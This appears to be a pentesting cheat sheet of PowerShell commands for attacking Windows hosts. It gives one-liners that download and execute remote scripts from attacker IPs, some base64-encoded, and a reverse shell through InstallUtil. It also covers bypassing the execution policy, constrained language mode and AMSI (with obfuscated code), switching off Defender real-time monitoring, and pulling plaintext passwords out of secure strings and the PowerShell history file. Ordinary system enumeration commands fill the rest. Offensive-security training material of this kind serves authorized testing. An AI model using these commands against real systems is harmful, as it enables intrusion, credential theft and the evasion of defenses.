<h1 id="Basic-PowerShell-for-Pentesters"><a href="#Basic-PowerShell-for-Pentesters" class="headerlink" title="Basic PowerShell for Pentesters"></a>Basic PowerShell for Pentesters</h1><h2 id="Default-PowerShell-locations"><a href="#Default-PowerShell-locations" class="headerlink" title="Default PowerShell locations"></a>Default PowerShell locations</h2><pre><code class="text">C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
</code></pre>
<h2 id="Basic-PS-commands-to-start"><a href="#Basic-PS-commands-to-start" class="headerlink" title="Basic PS commands to start"></a>Basic PS commands to start</h2><pre><code class="bash">Get-Help * #List everything loaded
Get-Help process #List everything containing &quot;process&quot;
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module &lt;modulepath&gt;
Get-Command -Module &lt;modulename&gt;
</code></pre>
<h2 id="Download-amp-Execute"><a href="#Download-amp-Execute" class="headerlink" title="Download &amp; Execute"></a>Download &amp; Execute</h2><pre><code class="bash">powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.9:8000/ipw.ps1&#39;)&quot;
echo IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.13:8000/PowerUp.ps1&#39;) | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http://10.2.0.5/shell.ps1&#39;)|iex&quot;
iex (iwr &#39;10.10.14.9:8000/ipw.ps1&#39;) #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open(&#39;GET&#39;,&#39;http://10.10.14.9:8000/ipw.ps1&#39;,$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create(&quot;http://10.10.14.9:8000/ipw.ps1&quot;) $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(
</code></pre>
<h3 id="Using-b64-from-linux"><a href="#Using-b64-from-linux" class="headerlink" title="Using b64 from linux"></a>Using b64 from linux</h3><pre><code class="bash">echo -n &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.31/shell.ps1&#39;)&quot; | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc &lt;BASE64_ENCODED_PAYLOAD&gt;
</code></pre>
<h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><h3 id="System-Net-WebClient"><a href="#System-Net-WebClient" class="headerlink" title="System.Net.WebClient"></a>System.Net.WebClient</h3><pre><code class="text">(New-Object Net.WebClient).DownloadFile(&quot;http://10.10.14.2:80/taskkill.exe&quot;,&quot;C:\Windows\Temp\taskkill.exe&quot;)
</code></pre>
<h3 id="Invoke-WebRequest"><a href="#Invoke-WebRequest" class="headerlink" title="Invoke-WebRequest"></a>Invoke-WebRequest</h3><pre><code class="text">Invoke-WebRequest &quot;http://10.10.14.2:80/taskkill.exe&quot; -OutFile &quot;taskkill.exe&quot;
</code></pre>
<h3 id="Wget"><a href="#Wget" class="headerlink" title="Wget"></a>Wget</h3><pre><code class="text">wget &quot;http://10.10.14.2/nc.bat.exe&quot; -OutFile &quot;C:\ProgramData\unifivideo\taskkill.exe&quot;
</code></pre>
<h3 id="BitsTransfer"><a href="#BitsTransfer" class="headerlink" title="BitsTransfer"></a>BitsTransfer</h3><pre><code class="text">Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
</code></pre>
<h2 id="Base64-Kali-amp-EncodedCommand"><a href="#Base64-Kali-amp-EncodedCommand" class="headerlink" title="Base64 Kali &amp; EncodedCommand"></a>Base64 Kali &amp; EncodedCommand</h2><pre><code class="bash">kali&gt; echo -n &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.9:8000/9002.ps1&#39;)&quot; | iconv --to-code UTF-16LE | base64 -w0
PS&gt; powershell -EncodedCommand &lt;Base64&gt;
</code></pre>
<h2 id="Execution-Policy"><a href="#Execution-Policy" class="headerlink" title="Execution Policy"></a>Execution Policy</h2><p>By default it is set to <strong>restricted.</strong> Main ways to bypass this policy:</p>
<pre><code class="text">1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#39;http://bit.ly/1kEgbuH&#39;)&quot;
8º Use command switch
Powershell -command &quot;Write-Host &#39;My voice is my passport, verify me.&#39;&quot;
9º Use EncodeCommand
$command = &quot;Write-Host &#39;My voice is my passport, verify me.&#39;&quot; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
</code></pre>
<p>More can be found <a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/" target="_blank" rel="noopener">here</a></p>
<h2 id="Constrained-language"><a href="#Constrained-language" class="headerlink" title="Constrained language"></a>Constrained language</h2><pre><code class="bash">$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
</code></pre>
<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><pre><code class="bash">#Easy bypass
Powershell -version 2
</code></pre>
<p>In current Windows that Bypass won’t work but you can use<a href="https://github.com/padovah4ck/PSByPassCLM" target="_blank" rel="noopener"> <strong>PSByPassCLM</strong></a>. <strong>To compile it you may need</strong> <strong>to</strong> _<strong>Add a Reference</strong>_ -&gt; <em>Browse</em> -&gt;<em>Browse</em> -&gt; add _C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll_ and <strong>change the project to .Net4.5</strong>.</p>
<h4 id="Direct-bypass"><a href="#Direct-bypass" class="headerlink" title="Direct bypass:"></a>Direct bypass:</h4><pre><code class="bash">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /U c:\temp\psby.exe
</code></pre>
<h4 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell:"></a>Reverse shell:</h4><pre><code class="bash">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
</code></pre>
<h2 id="AppLockerPolicy"><a href="#AppLockerPolicy" class="headerlink" title="AppLockerPolicy"></a>AppLockerPolicy</h2><p>Check which files/extensions are blacklisted/whitelisted.</p>
<pre><code class="text">Get-ApplockerPolicy -Effective -xml
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$a = Get-ApplockerPolicy -effective
$a.rulecollections
</code></pre>
<h2 id="Enable-WinRM-Remote-PS"><a href="#Enable-WinRM-Remote-PS" class="headerlink" title="Enable WinRM (Remote PS)"></a>Enable WinRM (Remote PS)</h2><pre><code class="bash">enable-psremoting -force #This enables winrm

## Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
  Where{ $_.NetWorkCategory -ne &#39;Private&#39;} |
  ForEach {
    $_
    $_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
  }
</code></pre>
<h2 id="Antivirus"><a href="#Antivirus" class="headerlink" title="Antivirus"></a>Antivirus</h2><pre><code class="bash">#Check status
Get-MpComputerStatus
#Disable
Set-MpPreference -DisableRealtimeMonitoring $true
</code></pre>
<h2 id="PS-History"><a href="#PS-History" class="headerlink" title="PS-History"></a>PS-History</h2><pre><code class="bash">Get-Content C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
</code></pre>
<h2 id="OS-version-and-HotFixes"><a href="#OS-version-and-HotFixes" class="headerlink" title="OS version and HotFixes"></a>OS version and HotFixes</h2><pre><code class="bash">[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query &#39;select * from win32_quickfixengineering&#39; | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description &quot;Security update&quot; #List only &quot;Security Update&quot; patches
</code></pre>
<h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><pre><code class="bash">Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
</code></pre>
<h2 id="Other-connected-drives"><a href="#Other-connected-drives" class="headerlink" title="Other connected drives"></a>Other connected drives</h2><pre><code class="bash">Get-PSDrive | where {$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;}| ft Name,Root
</code></pre>
<h3 id="Recycle-Bin"><a href="#Recycle-Bin" class="headerlink" title="Recycle Bin"></a>Recycle Bin</h3><pre><code class="bash">$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
</code></pre>
<p><a href="https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/" target="_blank" rel="noopener">https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/</a></p>
<h2 id="Domain-Recon"><a href="#Domain-Recon" class="headerlink" title="Domain Recon"></a>Domain Recon</h2><p>powerview.md</p>
<h2 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h2><pre><code class="bash">Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
</code></pre>
<h2 id="Secure-String-to-Plaintext"><a href="#Secure-String-to-Plaintext" class="headerlink" title="Secure String to Plaintext"></a>Secure String to Plaintext</h2><pre><code class="bash">$pass = &quot;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692&quot; | convertto-securestring
$user = &quot;HTB\Tom&quot;
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
</code></pre>
<p>Or directly parsing form XML:</p>
<pre><code class="bash">$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
</code></pre>
<h2 id="SUDO"><a href="#SUDO" class="headerlink" title="SUDO"></a>SUDO</h2><pre><code class="bash">#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString &#39;&lt;PASSWORD&gt;&#39; -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential(&quot;&lt;USERNAME&gt;&quot;, $pass)
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList &#39;-noprofile -command &amp;{Start-Process C:\xyz\nc.bat -verb Runas}&#39;

#Another method
$secpasswd = ConvertTo-SecureString &quot;&lt;password&gt;&quot; -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential (&quot;&lt;user&gt;&quot;, $secpasswd)
$computer = &quot;&lt;hostname&gt;&quot;
</code></pre>
<h2 id="Groups"><a href="#Groups" class="headerlink" title="Groups"></a>Groups</h2><pre><code class="bash">Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
</code></pre>
<h2 id="Clipboard"><a href="#Clipboard" class="headerlink" title="Clipboard"></a>Clipboard</h2><pre><code class="text">Get-Clipboard
</code></pre>
<h2 id="Processes"><a href="#Processes" class="headerlink" title="Processes"></a>Processes</h2><pre><code class="text">Get-Process | where {$_.ProcessName -notlike &quot;svchost*&quot;} | ft ProcessName, Id
</code></pre>
<h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><pre><code class="text">Get-Service
</code></pre>
<h2 id="Password-from-secure-string"><a href="#Password-from-secure-string" class="headerlink" title="Password from secure string"></a>Password from secure string</h2><pre><code class="bash">$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential(&quot;administrator&quot;, $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
</code></pre>
<h2 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h2><pre><code class="bash">Get-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State
</code></pre>
<h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h3 id="Interfaces"><a href="#Interfaces" class="headerlink" title="Interfaces"></a>Interfaces</h3><pre><code class="text">Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
</code></pre>
<h3 id="Route"><a href="#Route" class="headerlink" title="Route"></a>Route</h3><pre><code class="text">route print
</code></pre>
<h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><pre><code class="text">Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
</code></pre>
<h3 id="Hosts"><a href="#Hosts" class="headerlink" title="Hosts"></a>Hosts</h3><pre><code class="text">Get-Content C:\WINDOWS\System32\drivers\etc\hosts
</code></pre>
<h3 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h3><pre><code class="text">Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
</code></pre>
<h2 id="AMSI-bypass"><a href="#AMSI-bypass" class="headerlink" title="AMSI bypass"></a>AMSI bypass</h2><pre><code class="text">(old) 
[Ref].Assembly.GetType(&#39;System.Management.Automation.Ams&#39;+&#39;iUtils&#39;).GetField(&#39;am&#39;+&#39;siInitFailed&#39;,&#39;NonPu&#39;+&#39;blic,Static&#39;).SetValue($null,$true)

(new)
$a = &#39;System.Management.Automation.A&#39;;$b = &#39;ms&#39;;$u = &#39;Utils&#39;
$assembly = [Ref].Assembly.GetType((&#39;{0}{1}i{2}&#39; -f $a,$b,$u))
$field = $assembly.GetField((&#39;a{0}iInitFailed&#39; -f $b),&#39;NonPublic,Static&#39;)
$field.SetValue($null,$true)
</code></pre>
